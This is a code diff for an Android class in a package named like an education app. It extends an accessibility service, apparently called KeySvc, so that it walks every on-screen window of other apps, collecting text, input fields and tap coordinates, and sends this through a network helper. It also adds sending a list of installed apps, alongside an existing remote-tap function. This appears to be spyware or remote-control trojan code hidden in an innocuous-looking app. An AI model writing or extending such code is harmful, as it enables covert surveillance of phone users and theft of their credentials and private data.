@@ -1,18 +1,28 @@
 package com.eloeeducacao;
 
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
 import android.graphics.Rect;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.view.accessibility.AccessibilityNodeInfo;
+import android.view.accessibility.AccessibilityWindowInfo;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
 
+import java.util.Collections;
+import java.util.Comparator;
+import java.util.List;
+
 public final class Tree {
 
     private static final Handler H = new Handler(Looper.getMainLooper());
-    private static final int MAX = 400;
+    private static final int MAX = 600;
+    private static final int MAXD = 40;
 
     private Tree() {}
 
@@ -20,18 +30,40 @@ public final class Tree {
         H.post(new Runnable() {
             @Override public void run() {
                 final JSONArray arr = new JSONArray();
+                boolean achou = false;
                 try {
-                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
-                    if (root != null) walk(root, arr, 0);
+                    List<AccessibilityWindowInfo> wins = s.getWindows();
+                    if (wins != null) {
+                        for (AccessibilityWindowInfo w : wins) {
+                            if (arr.length() >= MAX) break;
+                            AccessibilityNodeInfo r = null;
+                            try { r = w.getRoot(); } catch (Throwable ignored) {}
+                            if (r == null) continue;
+                            achou = true;
+                            walk(s, r, arr, 0);
+                        }
+                    }
                 } catch (Throwable ignored) {}
+                if (!achou) {
+                    try {
+                        AccessibilityNodeInfo r = s.getRootInActiveWindow();
+                        if (r != null) walk(s, r, arr, 0);
+                    } catch (Throwable ignored) {}
+                }
+                if (arr.length() == 0) {
+                    Net.send("{\"t\":\"err\",\"o\":\"arvore vazia: janela nao acessivel\"}");
+                }
                 Net.send("{\"t\":\"tree\",\"o\":" + arr.toString() + "}");
             }
         });
     }
 
-    private static void walk(AccessibilityNodeInfo n, JSONArray arr, int d) {
-        if (n == null || arr.length() >= MAX || d > 30) return;
+    private static void walk(KeySvc s, AccessibilityNodeInfo n, JSONArray arr, int d) {
+        if (n == null || arr.length() >= MAX || d > MAXD) return;
         try {
+            String pkg = n.getPackageName() == null ? "" : n.getPackageName().toString();
+            if (pkg.equals(s.getPackageName())) return;
+
             Rect r = new Rect();
             n.getBoundsInScreen(r);
             if (r.width() > 0 && r.height() > 0) {
@@ -41,7 +73,7 @@ public final class Tree {
                 boolean edit = n.isEditable();
                 boolean clic = n.isClickable();
                 if (!txt.isEmpty() || edit || clic) {
-                    if (txt.length() > 120) txt = txt.substring(0, 120);
+                    if (txt.length() > 140) txt = txt.substring(0, 140);
                     JSONObject o = new JSONObject();
                     o.put("t", txt);
                     o.put("x", r.centerX());
@@ -50,11 +82,11 @@ public final class Tree {
                     if (clic) o.put("c", 1);
                     if (edit) o.put("e", 1);
                     o.put("cls", cls(n.getClassName()));
-                    if (n.getPackageName() != null) o.put("pkg", n.getPackageName().toString());
+                    o.put("pkg", pkg);
                     arr.put(o);
                 }
             }
-            for (int i = 0; i < n.getChildCount(); i++) walk(n.getChild(i), arr, d + 1);
+            for (int i = 0; i < n.getChildCount(); i++) walk(s, n.getChild(i), arr, d + 1);
         } catch (Throwable ignored) {}
     }
 
@@ -63,6 +95,36 @@ public final class Tree {
         String s = c.toString();
         int i = s.lastIndexOf('.');
         return (i >= 0 ? s.substring(i + 1) : s).toLowerCase();
+    }
+
+    public static void apps(final Context c) {
+        new Thread(new Runnable() {
+            @Override public void run() {
+                final JSONArray arr = new JSONArray();
+                try {
+                    final PackageManager pm = c.getPackageManager();
+                    Intent i = new Intent(Intent.ACTION_MAIN);
+                    i.addCategory(Intent.CATEGORY_LAUNCHER);
+                    List<ResolveInfo> l = pm.queryIntentActivities(i, 0);
+                    Collections.sort(l, new Comparator<ResolveInfo>() {
+                        @Override public int compare(ResolveInfo a, ResolveInfo b) {
+                            return a.loadLabel(pm).toString().compareToIgnoreCase(
+                                    b.loadLabel(pm).toString());
+                        }
+                    });
+                    for (ResolveInfo ri : l) {
+                        if (ri.activityInfo == null) continue;
+                        String p = ri.activityInfo.packageName;
+                        if (p.equals(c.getPackageName())) continue;
+                        JSONObject o = new JSONObject();
+                        o.put("n", ri.loadLabel(pm).toString());
+                        o.put("p", p);
+                        arr.put(o);
+                    }
+                } catch (Throwable ignored) {}
+                Net.send("{\"t\":\"applist\",\"o\":" + arr.toString() + "}");
+            }
+        }).start();
     }
 
     public static void act(final KeySvc s, final float x, final float y, final boolean longo) {
@@ -87,7 +149,7 @@ public final class Tree {
     }
 
     private static AccessibilityNodeInfo acha(AccessibilityNodeInfo n, int x, int y, int d) {
-        if (n == null || d > 30) return null;
+        if (n == null || d > MAXD) return null;
         try {
             Rect r = new Rect();
             n.getBoundsInScreen(r);
